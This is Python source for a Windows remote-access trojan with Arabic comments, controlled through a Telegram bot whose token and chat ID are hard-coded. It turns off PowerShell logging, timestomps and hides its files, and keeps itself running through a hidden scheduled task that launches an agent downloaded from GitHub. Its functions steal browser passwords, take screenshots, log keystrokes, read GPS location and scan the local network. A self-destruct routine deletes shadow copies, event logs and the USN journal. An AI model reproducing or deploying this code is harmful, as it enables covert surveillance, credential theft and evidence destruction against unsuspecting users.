import io
import zipfile
import shutil
import hashlib
import platform
import getpass
import subprocess
import socket
import requests
import shlex
import psutil
import asyncio
import threading
import queue
import uuid
import time
from datetime import datetime
from PIL import ImageGrab
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, ContextTypes, filters
from pathlib import Path
import sounddevice as sd
import gc
import base64
import json
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import os
import sys
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ctypes
from ctypes import wintypes
import winreg
###############################################################################################

# =========================
# CONFIG
# =========================
BOT_TOKEN = "8265205917:AAE4AtsWD52-kenwjYWrg6LtAZ25IEVOjVI"
AUTHORIZED_CHAT_ID = 6693150100
CURRENT_DIR = Path.cwd()
CREATE_NO_WINDOW = 0x08000000
RUNNING_PROCESSES = {}  # name -> PID
###############################################################################################


# 2️⃣ تحسين تعطيل PowerShell Logging (لحل مشكلة القيمة 1 التي ظهرت في الفحص)
def toggle_script_block_logging(status=False):
    reg_path = r"Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    try:
        # استخدام KEY_ALL_ACCESS لضمان امتلاك صلاحيات التعديل
        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_ALL_ACCESS)
        value = 1 if status else 0
        winreg.SetValueEx(key, "EnableScriptBlockLogging", 0, winreg.REG_DWORD, value)
        # إضافة تعطيل الـ Transcription أيضاً لزيادة التخفي
        winreg.SetValueEx(key, "EnableInvocationHeader", 0, winreg.REG_DWORD, value)
        winreg.CloseKey(key)
        return True
    except PermissionError:
        # فشل بسبب نقص الصلاحيات (يجب التشغيل كمسؤول)
        return False
    except Exception:
        return False

# 3️⃣ تحسين تشويه تاريخ الـ Prefetch (Timestomping)
def distort_execution_history(process_name="pywin.exe"):
    try:
        prefetch_path = r"C:\Windows\Prefetch"
        if not os.path.exists(prefetch_path):
            return False

        # تاريخ قديم جداً (2019) للتمويه
        old_time = time.mktime((2019, 5, 14, 10, 30, 0, 0, 0, 0))
        found = False

        for file in os.listdir(prefetch_path):
            if file.upper().startswith(process_name.upper().replace(".EXE", "")):
                file_path = os.path.join(prefetch_path, file)
                # تغيير تاريخ الوصول وتاريخ التعديل
                os.utime(file_path, (old_time, old_time))
                # تعيين السمات: مخفي (0x02) + نظام (0x04) + قراءة فقط (0x01)
                ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x01 | 0x02 | 0x04)
                found = True
        return found
    except Exception:
        return False

# 4️⃣ تحسين تفريغ الـ DNS وتحديث الـ ShimCache
def force_shimcache_update():
    try:
        # تفريغ الـ DNS Cache بشكل صامت تماماً
        subprocess.run("ipconfig /flushdns", shell=True, capture_output=True, creationflags=0x08000000)
        
        # حيلة لإجبار النظام على تحديث الـ ShimCache عبر لمس ملف نظامي غير مؤثر
        dummy_file = r"C:\Windows\System32\drivers\etc\hosts"
        if os.path.exists(dummy_file):
            current_time = time.time()
            os.utime(dummy_file, (current_time, current_time))
        return True
    except:
        return False
###############################################################################################


###############################################################################################
# Privileged File Invisibility — SYSTEM‑Level Artifact Concealment
import ctypes
import os

def apply_system_level_invisibility(file_path):
    """
    فرض طبقة إخفاء سيادية (Privilege-Bound Concealment).
    تستهدف تحييد الرؤية البشرية عبر دمج الملف مع ملفات النظام المحمية.
    """
    try:
        # FILE_ATTRIBUTE_READONLY = 0x01
        # FILE_ATTRIBUTE_HIDDEN = 0x02
        # FILE_ATTRIBUTE_SYSTEM = 0x04
        # ندمج هذه السمات معاً لجعل الملف "شبحاً"
        
        attrs = 0x01 | 0x02 | 0x04
        
        # استخدام SetFileAttributesW للتعامل مع المسارات الطويلة واليونيكود
        result = ctypes.windll.kernel32.SetFileAttributesW(str(file_path), attrs)
        
        if result:
            return True
        return False
    except Exception:
        return False

def secure_agent_infrastructure():
    CORE_DIR = r"C:\ProgramData\WinCore"
    AGENT_DIR = r"C:\ProgramData\WinExec"
    
    # إخفاء المجلد الرئيسي (المشغل) والفرعي (الوكيل)
    apply_system_level_invisibility(CORE_DIR)
    apply_system_level_invisibility(AGENT_DIR)
    
    # تأمين ملفات المشغل الرئيسي لضمان استمراريته بصمت
    core_files = [
        os.path.join(CORE_DIR, "pywin.exe"),
        os.path.join(CORE_DIR, "wincore.py")
    ]
    
    for f in core_files:
        if os.path.exists(f):
            apply_system_level_invisibility(f)

###############################################################################################
# Self-Delete
import os
import subprocess
import ctypes
import random
import string
import threading
import time

# --- إعدادات الهوية والتدمير ---
TARGET_DIRS = [r"C:\ProgramData\WinCore", r"C:\ProgramData\WinExec"]
PROCESSES_TO_KILL = ["pywin.exe", "winpy.exe", "python.exe"]

def elevate_to_system_privileges():
    """تفعيل امتيازات Debug للسيطرة المطلقة على عمليات النظام"""
    try:
        hToken = ctypes.wintypes.HANDLE()
        ctypes.windll.advapi32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), 0x0020 | 0x0008, ctypes.byref(hToken))
        luid = ctypes.wintypes.LUID()
        ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
        tp = ctypes.create_string_buffer(16)
        ctypes.memmove(tp, ctypes.addressof(luid), 8)
        ctypes.struct.pack_into("<I", tp, 8, 0x00000002) # SE_PRIVILEGE_ENABLED
        ctypes.windll.advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)
    except: pass

def structural_invalidation(file_path):
    """تفكيك البنية الداخلية للملف (إبطال الهوية البنائية)"""
    try:
        if os.path.exists(file_path):
            size = os.path.getsize(file_path)
            with open(file_path, "br+", buffering=0) as f:
                # 1. تدمير الـ Headers (كسر توقيع الملف)
                f.seek(0)
                f.write(os.urandom(min(2048, size)))
                
                # 2. تشويه الـ Code Sections (كسر المنطق الداخلي)
                for _ in range(3):
                    f.seek(random.randint(0, max(0, size - 512)))
                    f.write(os.urandom(512))
                
                # 3. تضليل الحجم (File Resize)
                f.truncate(random.randint(1, 1024)) 
                os.fsync(f.fileno())

            # 4. كسر السياق الاسمي (Random Renaming)
            rand_name = "".join(random.choices(string.hexdigits, k=16))
            os.rename(file_path, os.path.join(os.path.dirname(file_path), rand_name))
    except: pass

def initiate_final_purge():
    """إطلاق بروتوكول التدمير الطبقي غير المركزي"""
    elevate_to_system_privileges()

    # المرحلة 1: إطلاق خلايا التدمير البنيوي (Threads)
    threads = []
    for folder in TARGET_DIRS:
        if os.path.exists(folder):
            for root, _, files in os.walk(folder):
                for f in files:
                    t = threading.Thread(target=structural_invalidation, args=(os.path.join(root, f),))
                    t.start()
                    threads.append(t)
    
    # المرحلة 2: بناء أمر "الشبح" (Ghost Command)
    # تدمير العمليات -> مسح الظلال -> مسح السجلات -> تدمير الـ USN Journal
    kill_cmd = " ".join([f"taskkill /F /IM {p} /T 2>nul &" for p in PROCESSES_TO_KILL])
    
    # تضليل المحلل برسالة خطأ نظام وهمية قبل مسح السجلات
    decoy_log = "eventcreate /L SYSTEM /T ERROR /ID 100 /D \"Critical failure in Windows Update service. Repairing sectors.\" 2>nul"
    
    final_payload = (
        f"{kill_cmd} {decoy_log} & "
        "vssadmin delete shadows /all /quiet 2>nul & " # تدمير النسخ الاحتياطية
        "fsutil usn deletejournal /D C: 2>nul & "     # تدمير سجل معاملات NTFS
        "wevtutil cl System 2>nul & wevtutil cl Security 2>nul & wevtutil cl \"Windows PowerShell\" 2>nul & "
        "del /f /q C:\\Windows\\Prefetch\\* 2>nul & " # مسح شامل للـ Prefetch
        f"rmdir /s /q {TARGET_DIRS[0]} 2>nul & "
        f"rmdir /s /q {TARGET_DIRS[1]} 2>nul & "
        "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\" /f 2>nul & "
        "exit"
    )

    # المرحلة 3: التنفيذ المباشر في الذاكرة (Memory-Only Execution)
    subprocess.Popen(
        ["cmd.exe", "/c", final_payload],
        creationflags=0x08000000 | 0x00000008, # مخفي ومنفصل
        shell=False,
        close_fds=True
    )

    # المرحلة 4: الانتحار الفوري (Process Exit)
    os._exit(0)

###############################################################################################
def deploy_agent():
    # --- المسارات والمجلدات (ثابتة ومتوافقة مع هيكل المشروع) ---
    CORE_DIR = r"C:\ProgramData\WinCore"
    AGENT_DIR = r"C:\ProgramData\WinExec"
    
    AGENT_FILE = os.path.join(AGENT_DIR, "winexec.py")
    AGENT_URL = "https://raw.githubusercontent.com/anaslabrini/crossmos/main/winexec.py"

    CUSTOM_PYTHON = os.path.join(CORE_DIR, "pywin.exe") # المشغل الرئيسي (المنصة)
    AGENT_EXE = os.path.join(AGENT_DIR, "winpy.exe")    # الوكيل المستقل (الفرع)
    TASK_NAME = "WindowsUserAgent"

    # أعلام التشغيل الصامت (CREATE_NO_WINDOW + DETACHED_PROCESS)
    ST_FLAGS = 0x08000000 | 0x00000020

    # --- 0. تأمين القاعدة الرئيسية (WinCore) قبل البدء ---
    # نضمن أن المحرك الذي يعمل الآن مخفي ومشوه التاريخ
    apply_system_level_invisibility(CORE_DIR)
    apply_system_level_invisibility(CUSTOM_PYTHON)
    distort_execution_history("pywin.exe")

    # --- 1. إنشاء مجلد الوكيل وتأمينه ---
    os.makedirs(AGENT_DIR, exist_ok=True)
    apply_system_level_invisibility(AGENT_DIR)

    # --- 2. إنشاء نسخة winpy.exe وتطبيق التمويه الفوري ---
    if not os.path.exists(AGENT_EXE):
        try:
            # استخدام copy2 للحفاظ على الميتاداتا الأصلية للمنصة
            shutil.copy2(CUSTOM_PYTHON, AGENT_EXE)
            
            # حماية الفرع الجديد فور إنشائه
            apply_system_level_invisibility(AGENT_EXE)
            distort_execution_history("winpy.exe")
        except Exception as e:
            with open(os.path.join(AGENT_DIR, "deploy.log"), "a") as log:
                log.write(f"[{time.ctime()}] Failed to copy platform: {e}\n")
            return

    # --- 3. التحقق من جاهزية السكربت التنفيذي (winexec.py) ---
    is_agent_ready = False
    if os.path.exists(AGENT_FILE) and os.path.getsize(AGENT_FILE) > 500:
        try:
            with open(AGENT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().lower()
                if any(k in content for k in ["import", "def ", "class "]):
                    is_agent_ready = True
        except:
            pass

    # --- 4. تحميل السكربت من GitHub في حالة عدم الجاهزية ---
    if not is_agent_ready:
        for _ in range(3):
            try:
                if os.path.exists(AGENT_FILE):
                    os.remove(AGENT_FILE)
                
                # التحميل باستخدام User-Agent نظامي للتمويه
                r = requests.get(AGENT_URL, headers={'User-Agent':'Mozilla/5.0'}, timeout=15)
                if r.status_code == 200 and len(r.content) > 500:
                    with open(AGENT_FILE, 'wb') as f:
                        f.write(r.content)
                    
                    # إخفاء السكربت بعد تحميله مباشرة
                    apply_system_level_invisibility(AGENT_FILE)
                    is_agent_ready = True
                    break
            except:
                time.sleep(5)
    
    if not is_agent_ready:
        return

    # --- 5. إدارة الجدولة (Persistence) بحذر ---
    check = subprocess.run(['schtasks', '/query', '/TN', TASK_NAME],
                           capture_output=True, creationflags=ST_FLAGS)
    
    if check.returncode != 0:
        ps_task_script = f'''
        $u = (Get-CimInstance Win32_ComputerSystem).UserName; if (!$u) {{ $u = $env:USERNAME }};
        $action = New-ScheduledTaskAction -Execute "{AGENT_EXE}" -Argument "{AGENT_FILE}";
        $trigger = New-ScheduledTaskTrigger -AtLogOn;
        $principal = New-ScheduledTaskPrincipal -UserId $u -LogonType Interactive -RunLevel Highest;
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;
        Register-ScheduledTask -TaskName "{TASK_NAME}" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force;
        '''
        
        # تعطيل سجلات PowerShell أثناء تسجيل المهمة لعدم ترك أثر للنص البرمجي
        toggle_script_block_logging(status=False)
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_task_script],
                       capture_output=True, creationflags=ST_FLAGS)
        toggle_script_block_logging(status=True)

    # --- 6. تنظيف العمليات القديمة وتشغيل الوكيل الجديد ---
    proc_name = os.path.basename(AGENT_EXE)
    subprocess.run(f'taskkill /F /IM "{proc_name}"', shell=True,
                   capture_output=True, creationflags=ST_FLAGS)
    
    # انتظار قصير لضمان إغلاق العملية تماماً
    time.sleep(1)

    # تشويه التاريخ مرة أخرى قبل التشغيل لضمان أن السجل الناتج عن التشغيل الحالي يظهر كقديم
    distort_execution_history("winpy.exe")
    
    # تشغيل المهمة المجدولة
    subprocess.run(['schtasks', '/run', '/TN', TASK_NAME],
                   capture_output=True, creationflags=ST_FLAGS)
    

if __name__ == "__main__":
    deploy_agent()

##########################################################

kernel32 = ctypes.windll.kernel32

def apply_timestomp(path, year=2017, month=12, day=1):
    """
    تغيير تواريخ الملف (إنشاء، تعديل، وصول) بدقة متناهية عبر Windows API.
    """
    if not os.path.exists(path):
        return False
    try:
        # ضبط الساعة على 10:30 صباحاً لتجنب التواريخ المشبوهة (مثل 00:00)
        dt = datetime(year, month, day, 10, 30, 0)
        timestamp = int((dt.timestamp() * 10000000) + 116444736000000000)
        filetime = wintypes.FILETIME(timestamp & 0xFFFFFFFF, timestamp >> 32)

        # فتح مقبض للملف مع السماح بالمشاركة (ضروري إذا كان الملف قيد التشغيل)
        handle = kernel32.CreateFileW(
            str(path), 
            0x0100,               # FILE_WRITE_ATTRIBUTES
            0x01 | 0x02 | 0x04,    # FILE_SHARE_READ | WRITE | DELETE
            None, 
            3,                    # OPEN_EXISTING
            0x00,                 # FILE_ATTRIBUTE_NORMAL
            None
        )

        if handle != -1:
            kernel32.SetFileTime(handle, ctypes.byref(filetime), ctypes.byref(filetime), ctypes.byref(filetime))
            kernel32.CloseHandle(handle)
            return True
        return False
    except:
        return False

def run_targeted_timestomp():
    # --- إعداد المسارات اليدوية ---
    # يمكنك إضافة أي ملف EXE إضافي هنا يدوياً
    target_files = [
        r"C:\ProgramData\WinCore\pywin.exe",
        r"C:\ProgramData\WinCore\wincore.py",
        r"C:\ProgramData\WinExec\winpy.exe",
        r"C:\ProgramData\WinExec\winexec.py",
        # أضف أي ملفات EXE أخرى موجودة في المجلد هنا
        r"C:\ProgramData\WinExec\winmon.py",
        r"C:\ProgramData\WinExec\windef.py" 
    ]

    print("[*] Starting Manual Targeted Timestomp...")

    for file_path in target_files:
        if os.path.exists(file_path):
            success = apply_timestomp(file_path, year=2017)
            status = "SUCCESS" if success else "FAILED (In Use or No Privileges)"
            print(f"    [>] {os.path.basename(file_path)}: {status}")
        else:
            print(f"    [!] {os.path.basename(file_path)}: NOT FOUND")

if __name__ == "__main__":
    # تنفيذ العملية
    run_targeted_timestomp()
###############################################################################
# ===== Infrastructure (ملفات محددة فقط) =====

############################################################
GITHUB_RAW = {
    "wincore.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/wincore.py",
    "winexec.py": "https://raw.githubusercontent.com/anaslabrini/crossmos/refs/heads/main/winexec.py",
}
import requests
from pathlib import Path
import shutil

def restore_py_file(filename, target_dir):
    url = GITHUB_RAW.get(filename)
    if not url:
        return False

    target = Path(target_dir) / filename
    target.parent.mkdir(parents=True, exist_ok=True)

    r = requests.get(url, timeout=15)
    if r.status_code == 200:
        target.write_bytes(r.content)
        return True
    return False
def restore_winpy_from_pywin():
    src = Path(r"C:\ProgramData\WinCore\pywin.exe")
    dst = Path(r"C:\ProgramData\WinExec\winpy.exe")

    if not src.exists():
        print("[!] pywin.exe missing – cannot restore winpy.exe")
        return False

    dst.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(src, dst)
    return True

##################################################################################################

##################################################################################################


CREATE_NO_WINDOW = 0x08000000 # لإخفاء أي نافذة


def system_command_silent(cmd_list):
    try:
        subprocess.run(
        cmd_list,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        creationflags=CREATE_NO_WINDOW,
        check=True
        )
        return True
    except Exception as e:
        print(f"[!] Command failed: {e}")
        return False


# --- أوامر النظام ---
def restart_system():
    return system_command_silent(["shutdown", "/r", "/t", "0"])


def shutdown_system():
    return system_command_silent(["shutdown", "/s", "/t", "0"])


def enable_nosleep():
    commands = [
    ["powercfg", "-change", "-standby-timeout-ac", "0"],
    ["powercfg", "-change", "-standby-timeout-dc", "0"],
    ["powercfg", "-change", "-hibernate-timeout-ac", "0"],
    ["powercfg", "-change", "-hibernate-timeout-dc", "0"],
    ["powercfg", "-hibernate", "off"]
    ]
    success = True
    for cmd in commands:
        if not system_command_silent(cmd):
            success = False
            return success



# 1. تحديد المسار الحقيقي للسكريبت (حتى لو اشتغل بصلاحية System)
script_path = os.path.realpath(__file__)
script_dir = os.path.dirname(script_path)

# 2. إجبار النظام على تغيير مسار العمل الحالي إلى مسار السكريبت
os.chdir(script_dir)

# 3. تحديث CURRENT_DIR المستخدم في كودك ليتناسب مع المسار الجديد

CURRENT_DIR = Path(script_dir)

print(f"Working directory changed to: {os.getcwd()}")



def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # إزالة DPAPI prefix
    # فك تشفير المفتاح باستخدام DPAPI (Windows API)
    
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_password(buff, master_key):
    try:
        
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        
        # إذا فشل التشفير نرسل الهاش كما طلبت
        return f"Hash: {base64.b64encode(buff).decode()}"

def screenshot_to_memory():
    img = ImageGrab.grab()
    bio = io.BytesIO()
    img.save(bio, format="PNG")
    bio.seek(0)
    bio.name = "screenshot.png"
    return bio






class MemoryWatchdog:
    def __init__(self, threshold_percent=75, check_interval=30):
        self.threshold = threshold_percent
        self.interval = check_interval
        self.running = False

    def memory_usage(self):
        return psutil.virtual_memory().percent

    def cleanup(self):
        # تنظيف الذاكرة في Python
        gc.collect()

    def start(self):
        if self.running:
            return
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()

    def _loop(self):
        while self.running:
            mem = self.memory_usage()
            if mem >= self.threshold:
                print(f"[WATCHDOG] High RAM usage: {mem}% → cleaning")
                self.cleanup()
            time.sleep(self.interval)

# إنشاء وتشغيل الواتشدوغ عند بدء البوت
watchdog = MemoryWatchdog(threshold_percent=75, check_interval=30)
watchdog.start()



# =========================
# GLOBAL EXECUTOR (حل مشكلة التشنج)
# =========================
# هذا الكائن يسمح بتشغيل الأوامر الثقيلة في الخلفية دون تعطيل البوت
executor = ThreadPoolExecutor(max_workers=10)

AGENT_ID = uuid.uuid4().hex[:6]   # مثال: 7f3c9a
AGENT_HOST = socket.gethostname()
AGENT_USER = getpass.getuser()
AGENT_OS = platform.platform()

ACTIVE_AGENT_ID = None           # يتم تعيينه من خلال الأمر use
LAST_SEEN = time.time()
AGENTS = {}  # dictionary لتخزين كل الوكلاء (agents)



# =========================
# UTILS
# =========================

def safe_path(p: str) -> Path:
    return (CURRENT_DIR / p).resolve()

def sha256(file: Path):
    h = hashlib.sha256()
    with open(file, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()

def zip_folder(src: Path, zip_name: Path):
    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(src):
            for f in files:
                full = Path(root) / f
                z.write(full, full.relative_to(src))

# =========================
# PERSISTENT POWERSHELL SESSION (FIXED)
# =========================
ps_process = None
ps_queue = None

def powershell_on():
    global ps_process, ps_queue
    if ps_process is not None:
        return "❌ PowerShell session already running"

    ps_queue = queue.Queue()

    def reader_thread(proc, q):
        while True:
            line = proc.stdout.readline()
            if line == "":
                break
            q.put(line.rstrip())

    ps_process = subprocess.Popen(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        creationflags=0x08000000  # مخفية
    )

    thread = threading.Thread(target=reader_thread, args=(ps_process, ps_queue), daemon=True)
    thread.start()

    return "🟢 PowerShell session started"

# --- استبدل دالة powershell_exec القديمة بهذا الكود المطور ---

def powershell_exec(cmd: str, timeout=60):
    try:
        # [1] فتح النافذة المظلمة (تعطيل التسجيل)
        toggle_script_block_logging(status=False)
        time.sleep(0.1) # ضمان استقرار السياسة في الذاكرة

        proc = subprocess.Popen(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            creationflags=CREATE_NO_WINDOW
        )

        stdout, stderr = proc.communicate(timeout=timeout)

        # [2] إغلاق النافذة فوراً (إعادة الحالة للطبيعي)
        toggle_script_block_logging(status=True)

        if stderr:
            return stderr.strip()
        return stdout.strip() or "✔ Done"

    except subprocess.TimeoutExpired:
        toggle_script_block_logging(status=True) # ضمان الإعادة حتى عند الفشل
        proc.kill()
        return "❌ PowerShell command timed out"
    except Exception as e:
        toggle_script_block_logging(status=True)
        return f"❌ Error: {e}"
    finally:
        gc.collect()



def powershell_off():
    global ps_process
    if ps_process is None:
        return "❌ No PowerShell session running"

    ps_process.stdin.write("exit\n")
    ps_process.stdin.flush()
    ps_process.wait()
    ps_process = None
    return "🛑 PowerShell session stopped"

# =========================
# HELP TEXT
# =========================

POWERSHELL_HELP_TEXT = """
🟦 PowerShell Help — Command Reference (With Examples)
"""

HELP_TEXT = """
📁 FILE SYSTEM
"""

async def notify_startup(app):
    global LAST_SEEN
    LAST_SEEN = time.time()
    AGENTS[AGENT_ID] = {
        "host": AGENT_HOST,
        "user": AGENT_USER,
        "os": AGENT_OS,
        "last_seen": LAST_SEEN
    }
    msg = (
        "🟢 Agent Online\n"
        f"ID: {AGENT_ID}\n"
        f"Host: {AGENT_HOST}\n"
        f"User: {AGENT_USER}\n"
        f"OS: {AGENT_OS}"
    )
    try:
        await app.bot.send_message(chat_id=AUTHORIZED_CHAT_ID, text=msg)
    except Exception:
        pass


class WindowsNetworkRadar:
    def __init__(self):
        self.output = io.StringIO()
        self.common_ports = {80: "HTTP", 443: "HTTPS", 445: "SMB", 3389: "RDP"}
        self.lock = threading.Lock()

    def log(self, text):
        with self.lock:
            self.output.write(text + "\n")

    def scan_ports(self, ip):
        for port, svc in self.common_ports.items():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.2)
                if s.connect_ex((ip, port)) == 0:
                    self.log(f"   [!] Port {port} ({svc}) is OPEN")

    def ping_device(self, ip):
        # تنفيذ Ping صامت تماماً
        cmd = f"ping -n 1 -w 400 {ip}"
        proc = subprocess.run(cmd, capture_output=True, shell=True, creationflags=0x08000000)
        if proc.returncode == 0:
            try:
                name = socket.gethostbyaddr(ip)[0]
            except:
                name = "Unknown"
            self.log(f"[✔] Device Found: {ip} | Host: {name}")
            self.scan_ports(ip)

    def run_discovery(self):
        self.log(f"=== Windows Network Radar | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===")
        
        # 1. جلب معلومات الواجهات
        self.log("\n--- [1] Local Interfaces ---")
        for intf, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                    self.log(f"Interface: {intf} | IP: {addr.address}")

        # 2. فحص الواي فاي المحيط
        self.log("\n--- [2] Nearby Wi-Fi Networks ---")
        try:
            wifi = subprocess.check_output("netsh wlan show networks", shell=True, creationflags=0x08000000).decode('cp850', errors='ignore')
            self.log(wifi)
        except: self.log("WiFi Scanning Failed.")

        # 3. رادار الأجهزة (فحص النطاق النشط فقط)
        self.log("\n--- [3] Active LAN Devices ---")
        prefixes = []
        for addr in psutil.net_if_addrs().values():
            for a in addr:
                if a.family == socket.AF_INET and not a.address.startswith(("127.", "169.")):
                    prefixes.append(".".join(a.address.split('.')[:-1]))
        
        threads = []
        for prefix in set(prefixes):
            for i in range(1, 255):
                t = threading.Thread(target=self.ping_device, args=(f"{prefix}.{i}",))
                t.start()
                threads.append(t)
        
        for t in threads: t.join(timeout=0.1)
        
        return self.output.getvalue()


# =========================
# COMMAND ENGINE (تعديل طفيف لضمان استقرار الخيوط)
# =========================
def execute_command(cmd: str):
    global CURRENT_DIR
    out = io.StringIO()
    # نحافظ على sys.stdout الأصلي لنعيده في النهاية
    original_stdout = sys.stdout 
    sys.stdout = out
    
    if ACTIVE_AGENT_ID is not None and ACTIVE_AGENT_ID != AGENT_ID:
        sys.stdout = original_stdout
        return ""

    try:
        parts = shlex.split(cmd)
        if not parts:
            sys.stdout = original_stdout
            return ""

        c, a = parts[0], parts[1:]

        if c == "help": print(HELP_TEXT)
        elif c == "zbi":
            print("lhwa")

        elif c in ["passwords", "wifi", "history", "browser", "screenshot", "update", "downloads", "searchs", "keylogger", "rmkeylogger"]:
            # 1. إرسال الطلب للقناة (المجلد المتفق عليه)
            CH_PATH = r"C:\ProgramData\WinExec"
            if not os.path.exists(CH_PATH): os.makedirs(CH_PATH)
            
            with open(os.path.join(CH_PATH, "cmd.txt"), "w", encoding="utf-8") as f:
                f.write(c)
            
            # 2. انتظار الرد (بروتوكول القراءة والمسح)
            response = "❌ لا يوجد رد من الوكيل (تأكد من تسجيل دخول المستخدم)."
            res_file = os.path.join(CH_PATH, "res.txt")
            ss_file = os.path.join(CH_PATH, "ss.png")
            
            for _ in range(40): # انتظار لمدة 20 ثانية كحد أقصى
                if os.path.exists(res_file):
                    if c == "screenshot" and os.path.exists(ss_file):
                        # سيتم معالجة إرسال الصورة في handle_message
                        response = "✅ Screenshot Captured by Agent."
                    else:
                        with open(res_file, "r", encoding="utf-8") as f:
                            response = f.read()
                    
                    # تنظيف القناة (مسح الرد بعد قراءته)
                    try:
                        if os.path.exists(res_file): os.remove(res_file)
                    except: pass
                    break
                time.sleep(0.5)
            
            print(response)

        elif c == "gps":
            # 1. تفعيل الخدمة والخصوصية عبر الريجستري (قوة إضافية)
            fix_location_script = (
                # تفعيل الخصوصية للمستخدم الحالي
                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location' -Name 'Value' -Value 'Allow' -ErrorAction SilentlyContinue; "
                # تفعيل الخدمة على مستوى النظام
                "sc.exe config lfsvc start= auto; "
                "sc.exe start lfsvc; "
            )
            
            # 2. كود جلب الموقع مع معالجة الأخطاء
            ps_gps_cmd = (
                "Add-Type -AssemblyName System.Device; "
                "$Watcher = New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::High); "
                "$Watcher.Start(); "
                "for ($i=0; $i -lt 15; $i++) { "
                "   if ($Watcher.Status -eq 'Ready') { break }; "
                "   Start-Sleep -Seconds 1 "
                "}; "
                "if ($Watcher.Status -eq 'Ready') { "
                "   $pos = $Watcher.Position.Location; "
                "   Write-Output ('LAT:' + $pos.Latitude + '|LON:' + $pos.Longitude + '|ACC:' + $pos.HorizontalAccuracy) "
                "} else { Write-Output 'ERROR_SIGNAL' }"
            )

            try:
                # محاولة إصلاح الإعدادات أولاً
                subprocess.run(["powershell", "-Command", fix_location_script], capture_output=True, creationflags=0x08000000)
                
                # تنفيذ جلب الموقع
                process = subprocess.run(["powershell", "-Command", ps_gps_cmd], capture_output=True, text=True, creationflags=0x08000000)
                output = process.stdout.strip()
                
                if "LAT:" in output:
                    data = dict(item.split(":") for item in output.split("|"))
                    print(f"📍 Latitude: {data['LAT']}\n📍 Longitude: {data['LON']}\n🎯 Accuracy: {data['ACC']} meters")
                    print(f"🔗 Google Maps: https://www.google.com/maps?q={data['LAT']},{data['LON']}")
                else:
                    # حل احتياطي عبر IP في حال فشل الـ GPS البرمجي
                    print("⚠️ Hardware GPS failed. Trying IP Geolocation...")
                    response = requests.get("http://ip-api.com/json/", timeout=5).json()
                    if response['status'] == 'success':
                        print(f"📍 Location (via IP): {response['city']}, {response['country']}")
                        print(f"📍 Lat/Lon: {response['lat']}, {response['lon']}")
                        print(f"🔗 Google Maps: https://www.google.com/maps?q={response['lat']},{response['lon']}")
                    else:
                        print("❌ Failed to determine location via all methods.")
            except Exception as e:
                print(f"❌ Error: {e}")


                    
            except Exception as e:
                print(f"❌ خطأ في النظام: {e}")
        elif c == "pwd": print(CURRENT_DIR)
        elif c == "powershell-help": print(POWERSHELL_HELP_TEXT)
        elif c == "restore":
            print("[*] Starting restore procedure...")

            # Python files
            if not Path(r"C:\ProgramData\WinCore\wincore.py").exists():
                restore_py_file("wincore.py", r"C:\ProgramData\WinCore")
                print("[+] Restored wincore.py")

            if not Path(r"C:\ProgramData\WinExec\winexec.py").exists():
                restore_py_file("winexec.py", r"C:\ProgramData\WinExec")
                print("[+] Restored winexec.py")

            # EXE (winpy.exe only)
            if not Path(r"C:\ProgramData\WinExec\winpy.exe").exists():
                restore_winpy_from_pywin()
                print("[+] Restored winpy.exe from pywin.exe")

            print("[✓] Restore completed")

        elif c == "ls":
            items = list(CURRENT_DIR.iterdir())
            if a and a[0] == "size": items.sort(key=lambda x: x.stat().st_size)
            elif a and a[0] == "img": items = [x for x in items if x.suffix.lower() in (".png", ".jpg", ".jpeg")]
            for i in items: print(i.name)
        elif c == "cd":
            if a:
                p = safe_path(a[0])
                if p.exists() and p.is_dir(): CURRENT_DIR = p
            print(CURRENT_DIR)
        elif c == "mkdir" and a: safe_path(a[0]).mkdir(parents=True, exist_ok=True)
        elif c == "touch" and a: safe_path(a[0]).touch(exist_ok=True)
        elif c == "rm" and a:
            p = safe_path(a[0])
            if p.is_file(): p.unlink()
